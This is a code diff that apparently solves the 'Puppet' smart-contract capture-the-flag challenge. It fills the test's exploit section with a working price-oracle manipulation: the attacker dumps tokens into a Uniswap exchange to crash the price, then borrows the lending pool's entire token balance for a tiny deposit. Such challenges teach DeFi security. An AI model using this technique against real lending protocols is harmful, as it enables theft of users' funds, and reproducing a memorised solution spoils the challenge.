@@ -103,6 +103,22 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        const now = Math.floor(new Date().getTime()/1000);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1,
+            now+1000
+        );
+
+        // console.log(await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
     });
 
     after(async function () {
